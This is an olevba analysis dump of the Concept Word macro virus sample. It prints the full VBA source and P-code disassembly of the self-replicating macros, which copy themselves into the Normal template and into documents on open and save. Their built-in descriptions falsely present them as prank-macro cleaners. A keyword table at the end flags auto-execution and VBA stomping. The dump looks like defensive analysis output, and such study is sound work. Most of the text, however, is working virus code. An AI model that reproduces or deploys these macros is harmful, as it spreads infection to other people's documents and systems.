olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept.bc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept.bc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Concept.bc - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
 sMe$ = WordBasic.[FileName$]()
 sMacro$ = sMe$ + ":AutoOpen"
 WordBasic.MacroCopy sMacro$, "Global:DNTC"
 sMacro$ = sMe$ + ":FS"
 WordBasic.MacroCopy sMacro$, "Global:FileSave"
 sMacro$ = sMe$ + ":FSA"
 WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
 sMacro$ = sMe$ + ":FO"
 WordBasic.MacroCopy sMacro$, "Global:FileOpen"
 sMacro$ = sMe$ + ":AC"
 WordBasic.MacroCopy sMacro$, "Global:AutoClose"
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FSA.bas 
in file: Virus.MSWord.Concept.bc - OLE stream: 'Macros/VBA/FSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document with a new name"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FSA.MAIN"
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error Resume Next
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
sTMacro$ = sMe$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
WordBasic.FileSaveAs dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FS.bas 
in file: Virus.MSWord.Concept.bc - OLE stream: 'Macros/VBA/FS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FS.MAIN"
Dim Fname$
Dim sMe$
Dim sMacro$
Dim dlg As Object
Fname$ = WordBasic.[Left$](WordBasic.[Right$](WordBasic.[FileName$](), 12), 8)
If (Fname$ = "Document") Or (Fname$ = "Template") Then GoTo SetName
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:DNTC", sMacro$
sMacro$ = sMe$ + ":FSA"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
sMacro$ = sMe$ + ":FS"
WordBasic.MacroCopy "Global:FileSave", sMacro$
sMacro$ = sMe$ + ":AC"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":FO"
WordBasic.MacroCopy "Global:FileOpen", sMacro$
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
GoTo Done

SetName:
If Err.Number <> 102 Then
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
On Error GoTo -1: On Error GoTo Done
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:DNTC", sMacro$
sMacro$ = sMe$ + ":FSA"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
sMacro$ = sMe$ + ":FS"
WordBasic.MacroCopy "Global:FileSave", sMacro$
sMacro$ = sMe$ + ":AC"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":FO"
WordBasic.MacroCopy "Global:FileOpen", sMacro$
WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FO.bas 
in file: Virus.MSWord.Concept.bc - OLE stream: 'Macros/VBA/FO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FO.MAIN"
Dim iMacroCount
Dim Installed
Dim i
Dim sMe$
Dim sMacro$
WordBasic.DisableAutoMacros
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo Done
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
iMacroCount = WordBasic.CountMacros(1)
Installed = 0
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Or WordBasic.[MacroName$](i, 1) = "FS" Or WordBasic.[MacroName$](i, 1) = "FSA" Or WordBasic.[MacroName$](i, 1) = "FO" Or WordBasic.[MacroName$](i, 1) = "AC" Then
        Installed = Installed + 1
    End If
Next i
If Installed = 5 Then
 WordBasic.ToolsMacro Name:="AutoOpen", Run:=1
ElseIf Not Installed = 5 Then
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:DNTC", sMacro$
sMacro$ = sMe$ + ":FSA"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
sMacro$ = sMe$ + ":FS"
WordBasic.MacroCopy "Global:FileSave", sMacro$
sMacro$ = sMe$ + ":AC"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":FO"
WordBasic.MacroCopy "Global:FileOpen", sMacro$
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
End If
Done:
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AC.bas 
in file: Virus.MSWord.Concept.bc - OLE stream: 'Macros/VBA/AC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AC.MAIN"
WordBasic.ToolsMacro Name:="FileSave", Run:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Concept.bc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2459 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #6:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #7:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:DNTC"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FS"
' 	Add 
' 	St sMacro$ 
' Line #9:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":FSA"
' 	Add 
' 	St sMacro$ 
' Line #11:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FO"
' 	Add 
' 	St sMacro$ 
' Line #13:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":AC"
' 	Add 
' 	St sMacro$ 
' Line #15:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Label Abort 
' Line #17:
' 	EndSub 
' Macros/VBA/FSA - 2032 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #10:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #11:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #17:
' 	EndSub 
' Macros/VBA/FS - 3197 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Fname
' Line #3:
' 	Dim 
' 	VarDefn sMe
' Line #4:
' 	Dim 
' 	VarDefn sMacro
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitDI2 0x000C 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St Fname$ 
' Line #7:
' 	Ld Fname$ 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Paren 
' 	Ld Fname$ 
' 	LitStr 0x0008 "Template"
' 	Eq 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo SetName 
' 	EndIf 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #9:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #10:
' 	LitStr 0x000B "Global:DNTC"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":FSA"
' 	Add 
' 	St sMacro$ 
' Line #12:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FS"
' 	Add 
' 	St sMacro$ 
' Line #14:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":AC"
' 	Add 
' 	St sMacro$ 
' Line #16:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FO"
' 	Add 
' 	St sMacro$ 
' Line #18:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #20:
' 	GoTo Done 
' Line #21:
' Line #22:
' 	Label SetName 
' Line #23:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #24:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Done 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #30:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #31:
' 	LitStr 0x000B "Global:DNTC"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":FSA"
' 	Add 
' 	St sMacro$ 
' Line #33:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FS"
' 	Add 
' 	St sMacro$ 
' Line #35:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":AC"
' 	Add 
' 	St sMacro$ 
' Line #37:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #38:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FO"
' 	Add 
' 	St sMacro$ 
' Line #39:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #40:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Label Done 
' Line #43:
' 	EndSub 
' Macros/VBA/FO - 3103 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn Installed
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn sMe
' Line #6:
' 	Dim 
' 	VarDefn sMacro
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #8:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Done 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St iMacroCount 
' Line #14:
' 	LitDI2 0x0000 
' 	St Installed 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0002 "FS"
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0003 "FSA"
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0002 "FO"
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0002 "AC"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #17:
' 	Ld Installed 
' 	LitDI2 0x0001 
' 	Add 
' 	St Installed 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld Installed 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #22:
' 	Ld Installed 
' 	LitDI2 0x0005 
' 	Eq 
' 	Not 
' 	ElseIfBlock 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #25:
' 	LitStr 0x000B "Global:DNTC"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":FSA"
' 	Add 
' 	St sMacro$ 
' Line #27:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FS"
' 	Add 
' 	St sMacro$ 
' Line #29:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":AC"
' 	Add 
' 	St sMacro$ 
' Line #31:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld sMe$ 
' 	LitStr 0x0003 ":FO"
' 	Add 
' 	St sMacro$ 
' Line #33:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Label Done 
' Line #37:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #38:
' 	EndSub 
' Macros/VBA/AC - 1393 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0008 "FileSave"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #3:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

